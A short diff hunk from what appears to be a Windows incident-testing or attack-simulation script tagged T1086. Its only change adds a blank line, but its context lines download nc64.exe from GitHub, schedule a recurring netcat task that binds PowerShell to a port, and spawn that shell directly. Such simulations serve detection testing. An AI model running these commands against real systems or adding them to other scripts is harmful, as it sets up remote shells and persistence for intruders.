@@ -25,6 +25,7 @@ Invoke-WebRequest -uri https://github.com/IArandom/check/raw/main/nc64.exe -outf
 SCHTASKS /Create /SC MINUTE /TN "Incident Testing" /TR "C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe" /mo 30
 SCHTASKS /Run /TN "Incident Testing"  
 
+
 #   T1086
 #   Spawn the shell
 C:\soft\nc64.exe 127.0.0.1 443 -e powershell.exe
